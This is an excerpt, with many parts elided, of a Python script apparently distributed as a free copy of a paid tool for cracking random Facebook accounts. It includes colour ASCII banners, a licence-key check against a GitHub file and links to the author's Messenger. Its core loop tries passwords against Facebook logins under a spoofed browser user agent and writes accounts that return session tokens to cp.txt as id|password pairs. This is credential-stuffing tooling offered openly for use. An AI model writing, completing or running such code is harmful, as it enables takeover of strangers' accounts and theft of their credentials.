...
def logo2():
   ...
   \033[1;96m  8888888b.            d8b          d8b         
   \033[1;93m  888   Y88b           Y8P          Y8P         
   \033[1;95m  888    888                                    
   \033[1;93m  888   d88P  8888b.  8888 888  888 888 888d888 
   \033[1;95m  8888888P"      "88b "888 888  888 888 888P"   
    \033[1;93m 888 T88b   .d888888  888 Y88  88P 888 888      
    \033[1;93m 888  T88b  888  888  888  Y8bd8P  888 888           
     \033[1;93m888   T88b "Y888888  888   Y88P   888 888     
     \033[1;93m                      888                      
    \033[1;93m                     d88P                      
    \033[1;93m                   888P"       
...
════════════════════════════════════════════════════════❤️‍🔥
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Page  : Dark King\x1b[0m\x1b[1;97m]
...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://100024600461362"])
...
def notice():
	...
	runtxt("\033[0;97m Key Copy Kore Inbox koren👉❤️👈 >> %s%s"%(G,basesplit))
	runtxt("\033[0;97m 2 Minutes ar Modde ei Approved kora hobe")
	os.system("xdg-open https://m.me/100024600461362")
	subprocess.check_output(["am", "start", "https://github.com/Rajvir0/Paid-To-Free/blob/main/Approved-By-Rajvir.txt"])
...
class Main:
	def __init__(self):
		...
		try:
			...
			plr = requests.get('https://github.com/Rajvir0/Paid-To-Free/blob/main/Approved-By-Rajvir.txt').text
			if basesplit in plr:
				key = basesplit
   ...
   \033[1;95m  8888888P"      "88b "888 888  888 888 888P"   
    \033[1;93m 888 T88b   .d888888  888 Y88  88P 888 888      
    \033[1;93m 888  T88b  888  888  888  Y8bd8P  888 888           
     \033[1;93m 888   T88b "Y888888  888   Y88P   888 888     
     \033[1;93m                      888                      
    \033[1;93m                     d88P                      
    \033[1;93m                   888P"       
...
═══════════════════════════════════❤️‍🔥
    """)
		...
		print("%s [%s•%s] %sVERSION   : %sV1.2mod"%(G,R,G,B,G))
		...
		print("───────────────────────────────────────────────────────× ")
		print("%s [%sN%s]%s CRACK RANDOM FB ID 2009-11 {JUST NOW} %s(PAID➤Tools~Free)"%(G,R,G,Y,B))
  ...
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0'
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				print("\r  \033[0;92m   [=RAJ😭=CP=>] %s | %s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write("   [=RAJ😭=CP=>]  %s|%s\n"%(uid, pw))
				break
			else:
				continue
